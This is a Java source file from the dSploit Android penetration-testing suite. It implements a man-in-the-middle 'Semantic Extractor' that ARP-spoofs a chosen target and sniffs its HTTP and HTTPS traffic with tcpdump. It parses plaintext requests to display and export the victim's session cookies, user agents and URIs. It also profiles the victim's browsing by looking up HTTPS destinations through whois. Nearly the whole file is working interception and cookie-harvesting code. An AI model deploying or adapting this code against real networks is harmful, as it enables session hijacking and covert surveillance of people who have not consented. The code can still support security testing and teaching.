/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.R.drawable;
import it.evilsocket.dsploit.core.Shell.OutputReceiver;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog;
import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;
import it.evilsocket.dsploit.plugins.mitm.userprofiler.Profile;
import it.evilsocket.dsploit.plugins.mitm.userprofiler.UserProfiler;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.view.MenuItem;




public class Extractor extends SherlockActivity implements OnClickListener{




	//List of common HTTP headers
	private static String[] HTTPRequestHeaders={"Host","GET","Accept","Accept-Charset","Accept-Encoding","Accept-Language","Accept-Datetime",
		"Authorization","Cache-Control","Connection","Cookie","Content-Length","Content-MD5","Content-Type","Date",
		"Expect","From","If-Match","If-Modified-Since","If-None-Match","If-Range","If-Unmodified-Since",	
		"Max-Forwards","Origin","Pragma","Proxy-Authorization","Range","Referer","TE","Upgrade","User-Agent","Via","Warning"};


	//this regex validates an IP, no matter which underlying protocols are used, and creates 2 groups to save the SRC and DST IP`s
	private static String IPPacketRegex="^.+length\\s+(\\d+)\\)\\s+([\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3})\\.[^\\s]+\\s+>\\s+([\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3})\\.[^\\:]+:.+";
	//pattern used to compile IPPacketRegex
	private static Pattern 			PARSER 	 					=null;
	//profiler used to parse profiles.xml 
	private UserProfiler profiler								=null;


	private static boolean listenning			=false;	//controls the state of the button
	private	static  String PCAP_TARGET_FILTER	="";	//saves the tcpdump filter created for the target
	private static String targetIP				="";	//target IP 
	private static String targetMac				="";	//trget MAC
	private static SpoofSession session			=null;	//spoofSession object->create an ARP spoof session


	private static BrowserRequestListAdapter ReqListAdapter=null;	//adapter object for listview

	//views displayed on this activity
	private TextView IPAddress					=null;				
	private TextView MacAddress					=null;
	private ListView HTTPGetsList				=null;
	private ToggleButton startStop		=null;
	private Button getProfiles			=null;

	private String PCAP_FILE_NAME		=null;	//pcap file name (optional)



	private NetworkAsynchronousTask task	=null;	//asynctask used for talk to the whois server

	//this object is used to store the date abour HTTP/s requests
	public static class BrowserRequest{
		HashMap<String, String> requestData;	//HEADERS, COOKIES....
		boolean hasCookies=false;;				//does this request has cookies?
		boolean sslProtected=false;				//goes over ssl?
		int requestCount;						//how many request to this domain
		Date date;								//current date
		String URI="";							//requested resource
		String address="";						// domain IP address
		String netName="";						//name of corporative net as appears on whois record		
		public BrowserRequest(){
			requestCount=0;
			URI="";
			address="";
			netName="";
		}


		public boolean goOverSSL(){
			return sslProtected;
		}

		public String getRequestHeader(String key){
			String result="";
			if(requestData.get(key)!=null){
				result=requestData.get(key);
			}
			return result;
		}

		public int getRequestCount(){
			return requestCount;
		}

		/*
		public void LOGitem(String label){
			if(!this.sslProtected){
				printhashmap(this.requestData);
				Log.d(label,"URI: "+URI);
				Log.d(label,"COOKIES: "+String.valueOf(hasCookies));
			}



			Log.d(label,"SSL: "+String.valueOf(sslProtected));
			Log.d(label,"Addres: "+this.address);
			Log.d(label,"NETNAME: "+this.netName);
			Log.d(label,"  ");

		}*/

	}

	/*
	 * this is used to talk with the wohis server and obtain the record for a certain IP
	 * is called when a HTTPS message is captured.
	 */
	private class NetworkAsynchronousTask extends AsyncTask<String, Void, String>{
		protected String doInBackground(String... params) {
			String address=params[0];
			String queryResult="";
			Socket socket;
			//hardcoded server...
			String serverName = "whois.ripe.net";
			//whois port
			int port = 43;
			try {
				socket = new Socket(serverName, port);
				Writer out = new OutputStreamWriter(socket.getOutputStream());
				out.write(address + "\r\n");
				out.flush();
				DataInputStream theWhoisStream;
				theWhoisStream = new DataInputStream(socket.getInputStream());
				String s;
				while ((s= theWhoisStream.readLine()) != null) {
					//Log.d("ssla",s);
					//if netname found, break
					if(s.contains("netname")){
						queryResult=s.replace("netname:", "").trim();
						//Log.d("ssldespues",s);
						break;
					}
				}
			}
			catch (IOException e) {
			}

			return queryResult;
		}



		protected void onPostExecute(String result) {

			super.onPostExecute(result);
			//Log.d("SSL",result);
		}



	}

	public static class BrowserRequestListAdapter<syncrhonized> extends ArrayAdapter<BrowserRequest>{

		static Context adapterContext					=null;	//context
		static int layout_id;									//row layout's ID
		static ArrayList<BrowserRequest> list			=null;	//this list is used for store the browserRequest objects shown in the list

		static class ListElementHolder{

			ImageView favicon;
			TextView host;
			TextView Cookies;
			TextView request_number;
			TextView UserAgent;
			TextView date;
			TextView URI;
			boolean sslHolder=false;

		}



		//	picks the favicon depending on the requested domain
		public static int getFavIcon(String host){

			if(host!=null){

				if(host.contains("facebook")){
					return R.drawable.favicon_facebook;

				}if(host.contains("amazon")){
					return R.drawable.favicon_amazon;

				}if(host.contains("twitter")){
					return R.drawable.favicon_twitter;

				}if(host.contains("google")){
					return R.drawable.favicon_google;


				}if(host.contains("uc3m")){
					return R.drawable.favicon_uc3m;
				}

				if(host.contains("youtube")){	
					return R.drawable.favicon_youtube;
				}

			}
			return drawable.favicon_generic;
		}

		public BrowserRequestListAdapter(Context context, int layout) {
			super(context, layout);
			adapterContext=context;
			layout_id=layout;
			list=new ArrayList<BrowserRequest>();
		}

		public synchronized BrowserRequest getItem(int index){

			return list.get(index);
		}

		public synchronized void addHTTPSitem(BrowserRequest req){
			boolean found=false;

			for(BrowserRequest listRequest:list){

				if(listRequest.sslProtected){	

					if( listRequest.address.equals(req.address)){

						listRequest.date=req.date;
						listRequest.requestCount++;


						found=true;
						break;

					}

				}
			}
			if(!found){
				req.requestCount++;
				list.add(req);
			}

		};

		public synchronized  void addHTTPItem(BrowserRequest req){
			boolean found=false;


			for(BrowserRequest listRequest:list){

				if(!listRequest.sslProtected){



					if(listRequest.requestData.get("Host")==null ||req.requestData.get("Host")==null ){
						//null domain on new request or stored request
					}else{



						if(listRequest.requestData.get("Host").equals(req.requestData.get("Host"))){
							//if domain found, update the data
							listRequest.requestCount++;
							listRequest.date=req.date;
							listRequest.hasCookies=req.hasCookies;
							listRequest.requestData=req.requestData;
							listRequest.URI=req.URI;
							found=true;
							break;
						}
					}
				}
			}if(!found){
				//else, add new entry to the list
				req.requestCount++;
				list.add(req);
				//Log.d("","item added");

			}



		}
		public int getCount(){
			return list.size();
		}

		public synchronized View getView(int position, View convertView, ViewGroup parent) {
			View listElement =convertView;
			ListElementHolder holder;

			if(listElement==null){
				LayoutInflater inflater=(LayoutInflater) adapterContext.getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
				listElement=inflater.inflate(layout_id, null,false);

				holder=new ListElementHolder();





				holder.host=(TextView)listElement.findViewById(R.id.req_host);
				holder.favicon=(ImageView)listElement.findViewById(R.id.req_favicon);
				holder.Cookies=(TextView)listElement.findViewById(R.id.cookies);
				holder.request_number=(TextView)listElement.findViewById(R.id.numberOfRequest);
				holder.UserAgent=(TextView)listElement.findViewById(R.id.user_Agent);
				holder.date=(TextView)listElement.findViewById(R.id.RequestDate);
				holder.URI=(TextView)listElement.findViewById(R.id.requestURI);



				listElement.setTag(holder);



			}else{
				holder=(ListElementHolder)listElement.getTag();


			}

			if(list.get(position).sslProtected==false )
			{

				if(list.get(position).requestData.get("Host")==null){
					//regular HTTP rquest
				}
				holder.favicon.setImageResource(getFavIcon(list.get(position).requestData.get("Host")));

				holder.host.setText(Html.fromHtml("<b>Host: </b>")+list.get(position).requestData.get("Host")+" ("+list.get(position).address+")");
				holder.Cookies.setText(Html.fromHtml("<b>Hash Cookies?: </b>")+(list.get(position).hasCookies ? "Yes(long tap me)":"No"));
				holder.UserAgent.setText(Html.fromHtml("<b>User-Agent: </b>")+list.get(position).requestData.get("User-Agent"));
				holder.request_number.setText(Html.fromHtml("<b>Number of Requests: </b>")+String.valueOf(list.get(position).requestCount));
				holder.date.setText(Html.fromHtml("<b>Request Date: </b>")+String.valueOf(list.get(position).date));
				holder.URI.setText(Html.fromHtml("<b>URI: </b>")+list.get(position).URI);
				listElement.setBackgroundColor(0x00000000);


			}else{
				//regular HTTPS rquest
				holder.favicon.setImageResource(R.drawable.favicon_padlock);
				holder.host.setText(Html.fromHtml("<b>Host: </b>")+list.get(position).netName+" ("+list.get(position).address+")");
				holder.Cookies.setText(Html.fromHtml("<b>Hash Cookies?: UNAVAILABLE INFORMATION</b>"));
				holder.UserAgent.setText(Html.fromHtml("<b>User-Agent: UNAVAILABLE INFORMATION</b>"));
				holder.request_number.setText(Html.fromHtml("<b>Number of Requests: </b>")+String.valueOf(list.get(position).requestCount));
				holder.date.setText(Html.fromHtml("<b>Request Date: </b>")+String.valueOf(list.get(position).date));
				holder.URI.setText(Html.fromHtml("<b>URI: UNAVAILABLE INFORMATION</b>"));
				listElement.setBackgroundColor(0xFFE00000);
			}

			return listElement;
		}




	}


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.extractor_layout);
		setTitle( System.getCurrentTarget() + " > MITM > Semantic Extractor" );
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		PARSER= Pattern.compile(IPPacketRegex);



		//retrieve the target data

		targetIP=getIntent().getExtras().getString("target_IP");
		targetMac=getIntent().getExtras().getString("target_MAC");
		//create the PCAP filter with target IP
		PCAP_TARGET_FILTER=" -nA src host "+targetIP+" and '(dst port 80 or 443)'";
		Log.d("",PCAP_TARGET_FILTER);

		//create displayed views
		IPAddress=(TextView)findViewById(R.id.ExtTargetIP);
		MacAddress=(TextView)findViewById(R.id.ExtTargetMac);
		HTTPGetsList=(ListView)findViewById(R.id.httpGETlist);
		IPAddress.setText(IPAddress.getText()+targetIP);
		MacAddress.setText(MacAddress.getText()+targetMac);

		//
		startStop=(ToggleButton)findViewById(R.id.startStop);
		startStop.setOnClickListener(this);

		getProfiles=(Button)findViewById(R.id.startProfiler);
		getProfiles.setOnClickListener(this);




		ReqListAdapter=new BrowserRequestListAdapter(getApplicationContext(), R.layout.getreq_list_item);
		HTTPGetsList.setAdapter(ReqListAdapter);

		HTTPGetsList.setOnItemLongClickListener(new OnItemLongClickListener() {



			@Override
			public boolean onItemLongClick(AdapterView<?> arg0, View arg1,
					int position, long arg3) {

				if(ReqListAdapter.getItem(position).hasCookies){
					final String filename="dsploit-"+ReqListAdapter.getItem(position).requestData.get("Host")+"-cookies.data";
					final String cookies=ReqListAdapter.getItem(position).requestData.get("Cookie");

					AlertDialog.Builder builder=new AlertDialog.Builder(Extractor.this);
					builder.setTitle("Cookies");
					builder.setMessage(splitCookies(cookies));

					builder.setPositiveButton("Export",new DialogInterface.OnClickListener(){

						@Override
						public void onClick(DialogInterface dialog, int which) {

							File cookie=new File(System.getStoragePath(),filename);
							try {
								FileWriter writer=new FileWriter(cookie);
								writer.write(cookies);
								writer.close();
								Toast.makeText(Extractor.this, "Cookies saved succesfully->"+filename, Toast.LENGTH_LONG).show();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						};


					});



					builder.setNegativeButton("Done!", new DialogInterface.OnClickListener() {

						@Override
						public void onClick(DialogInterface dialog, int which) {

							dialog.cancel();

						}
					}).create().show();

					return true;
				}
				return false;
			}


		});

		session=new SpoofSession(false, false, null, null);






		new ConfirmDialog("save the file","Want to save a .pcap file?", this, new ConfirmDialogListener() {

			@Override
			public void onConfirm() {
				// TODO Auto-generated method stub
				PCAP_FILE_NAME = ( new File( System.getStoragePath(), "dsploit-sniff-" + java.lang.System.currentTimeMillis() + ".pcap" ) ).getAbsolutePath();				
				startCapturing();
			}

			@Override
			public void onCancel() {
				// TODO Auto-generated method stub
				startCapturing();
			}
		}).show();




	}


	private void startCapturing() {		
		//change status to listenning=true
		listenning=true;
		//set true the togglebutton
		startStop.setChecked(true);

		//if the re is a tcpdump session alive, we first kill it
		System.getTcpDump().kill();

		session.start( new OnSessionReadyListener() {			

			String req="";				//request data
			String URI="";				//Request URI
			boolean foundGET=false;		//have we found GET field?
			HashMap<String,String> requestFields;
			BrowserRequest HTTPrequest=null;
			BrowserRequest HTTPsrequest=null;
			String address="";

			public void onError( String error ) {

			}

			//when the session is ready...
			public void onSessionReady() {

				//start Sniffing the traffic according to PCAP_TARGET_FILTER
				System.getTcpDump().sniff( PCAP_TARGET_FILTER, PCAP_FILE_NAME, new OutputReceiver(){





					public void onStart(String command) { }


					//when the sniffer gets a new packet
					public void onNewLine( String line ) {


						try
						{

							//sniffed data contains an plain HTTP request field
							if(containsHTTPRequestHeaderField(line)){
								//Log.d(DEBUG_HTTP,"HTTP packet");
								//the line contains a GET FIELD
								if(line.contains("GET")){
									//exist previous GET
									if(foundGET){
										/*
										 * this means we have reached the end of 
										 * the last request and a new one starts
										 */
										requestFields=requestToHashMap(req);
										HTTPrequest=new BrowserRequest();
										HTTPrequest.requestData=requestFields;
										HTTPrequest.address=address;
										HTTPrequest.hasCookies=requestFields.containsKey("Cookie");
										HTTPrequest.URI=URI;
										HTTPrequest.date=new Date(java.lang.System.currentTimeMillis());
										HTTPrequest.sslProtected=false;
										Extractor.this.runOnUiThread(new Runnable(){
											@Override
											public void run() {

												ReqListAdapter.addHTTPItem(HTTPrequest);
												ReqListAdapter.notifyDataSetChanged();
											}
										});
										foundGET=false;
										URI="";
										req="";

									}
									//Do not exist previous GET
									if(!foundGET){

										//change foundGEt status
										foundGET=true;

										//get request URI
										URI=line.substring(line.indexOf("GET"),line.length()).replace("GET", "").replace("HTTP/1.1", "").trim();



									}

									//field distinct of GET
								}else{
									//append new data
									req+=line+"#";
								}

							}




							//check the packet's IP headerS for HTTP

							if(line.contains(".80") && !line.contains(".443")){
								Matcher matcher =PARSER.matcher(line);
								if(matcher.find()){

									address=matcher.group(3);
									//Log.d(DEBUG_HTTP,"HTTP package");

								}


							}

							if(line.contains(".443")){
								//got an HTTPS request
								Matcher matcher =PARSER.matcher(line);
								if(matcher.find()){
									//Log.d(DEBUG_SSL,"HTTPs package");
									HTTPsrequest=new BrowserRequest();
									//get IP address from regex
									HTTPsrequest.address=matcher.group(3);
									HTTPsrequest.date=new Date(java.lang.System.currentTimeMillis());
									HTTPsrequest.requestData=new HashMap<String,String>();
									HTTPsrequest.hasCookies=false;
									HTTPsrequest.URI="";
									HTTPsrequest.sslProtected=true;

									//get the netname field of the whois record 
									task=new NetworkAsynchronousTask();
									HTTPsrequest.netName=task.execute(matcher.group(3)).get();


									//request.LOGitem();
									Extractor.this.runOnUiThread(new Runnable(){

										@Override
										public void run() {
											//add the new HTTPS request
											ReqListAdapter.addHTTPSitem(HTTPsrequest);
											ReqListAdapter.notifyDataSetChanged();

										}


									});
								}


							}



						}//end try

						catch( Exception e )
						{
							System.errorLogging( "Error during packet capturing", e );
						}
					}//end onNewLine

					@Override
					public void onEnd(int exitCode) { }
				}).start();				
			}
		});//end session.start


	}//end startCapturing



	/*
	public static void printhashmap(HashMap<String, String> map){



		if(map!=null && map.keySet()!=null){


			int i=1;
			for(String key: map.keySet()){
				Log.d("HASHMAP",i+" "+key+":"+map.get(key));
				i++;
			}

		}

	}

	 */

	/*
	 * Given a string containing all the request data fields separated
	 * by "#" character this method will return an hashMap structure where
	 * the key is the field name and the value is the field content
	 */
	public static HashMap<String, String> requestToHashMap(String req){
		HashMap<String,String> map=new HashMap<String, String>();
		String[] data;
		//split all the request and save it on an array
		data=req.split("#");
		for(String line: data){
			//for each pair, get the corresponding field name
			for(String headerField: HTTPRequestHeaders){

				if(line.contains(headerField) ){
					//add new entry key:fieldname value:the field name without the fieldname
					map.put(headerField, line.replace(headerField+": ", ""));
				}

			}	
		}



		return map;
	}



	/*
	 * finds out if the request contains one of the common
	 * request header fields
	 */
	public static boolean containsHTTPRequestHeaderField(String input){
		boolean found =false;

		//look for field names
		for(String headerField: HTTPRequestHeaders){
			if(input.contains(headerField)){
				found=true;
				break;
			}

		}
		return found;
	}


	//this is called when the capture session is over
	private void stopCapturing( ) {		
		//stop the current spoof session
		session.stop();
		//kill the current tcpdump session
		System.getTcpDump().kill();
		//update the search state
		listenning= false;
		//uncheck the start/stop button
		startStop.setChecked(false);              			
	}




	/*
	 * Given a String containing all the request's cookies
	 * This method will return a String with all the pairs
	 * name-value separated with new line character
	 */
	public static String splitCookies(String cookie){
		String[] cookies;
		String parsedCookies="";
		//split the cookies by " " character
		cookies=cookie.split(" ");

		//TODO improve this 

		for(String str:cookies){
			//build the new String
			parsedCookies+=str+"\n\n";

		}
		return parsedCookies;
	}


	/*
	 * ->onOptionsItemSelected takes you to the parent activity when actionBar arrow is pressed
	 * 
	 * ->onbackPressed does the same but when  the back button on the device is pressed
	 * 
	 * @see com.actionbarsherlock.app.SherlockActivity#onOptionsItemSelected(android.view.MenuItem)
	 */



	public boolean onOptionsItemSelected( MenuItem item ) 
	{    
		switch( item.getItemId() ) 
		{        
		case android.R.id.home:            

			onBackPressed();

			return true;

		default:            
			return super.onOptionsItemSelected(item);    
		}
	}

	public void onBackPressed() {
		super.onBackPressed();
		overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}


	@Override
	public void onClick(View v) {
		//on click method from onClick listener interface
		if(v.getId()==startStop.getId()){
			if(listenning){
				stopCapturing();

			}else{
				startCapturing();
			}

		}else if(v.getId()==getProfiles.getId()){

			profiler=new UserProfiler(getApplicationContext(),new File(System.getStoragePath()+"/profiles.xml").getAbsolutePath());
			ArrayList<Profile> retrievedProfiles=profiler.parse();
			ArrayList<Profile> validatedProfiles=null;
			//Retrieved
			if(retrievedProfiles!=null){
				validatedProfiles=profiler.applyProfiler(ReqListAdapter.list,retrievedProfiles);
				if(validatedProfiles!=null){

					AlertDialog.Builder builder=new AlertDialog.Builder(Extractor.this);
					builder.setTitle("Validated Profiles");
					builder.setMessage("Validated Profiles:"+ Profile.toString(validatedProfiles));
					builder.setNeutralButton("OK!",	new DialogInterface.OnClickListener() {

						@Override
						public void onClick(DialogInterface dialog, int which) {
							dialog.cancel();

						}
					});
					builder.show();

				}

			}





		}
	}

}
